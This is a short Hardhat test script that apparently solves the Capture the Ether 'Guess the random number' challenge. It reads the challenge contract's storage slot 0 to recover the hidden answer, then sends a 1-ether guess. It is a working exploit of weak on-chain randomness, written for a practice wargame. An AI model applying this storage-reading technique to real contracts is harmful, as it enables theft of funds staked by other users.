import {ethers} from 'hardhat';
import {BigNumber, Contract, Signer} from 'ethers';
import {expect} from 'chai';
import {formatEtherscanTx} from '../utils/format';

let accounts: Signer[];
let eoa: Signer;
let contract: Contract; // challenge contract

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];

  const factory = await ethers.getContractFactory('GuessTheRandomNumberChallenge');

  contract = factory.attach(`0x26740846bE990ab90EF80Af0a77f32f33155015d`);
});

it('Guess the number', async function () {
  // Develop the challenge here!
  const storageValue = await ethers.provider.getStorageAt('0x26740846bE990ab90EF80Af0a77f32f33155015d', 0);
  const answer = BigNumber.from(storageValue);

  const tx = await contract.guess(answer, {value: ethers.utils.parseEther('1')});

  if (tx && tx.hash) {
    console.log(formatEtherscanTx(tx.hash));
  }

  //   Check the challenge result here!
  const completed = await contract.isComplete();
  expect(completed).to.be.true;
});
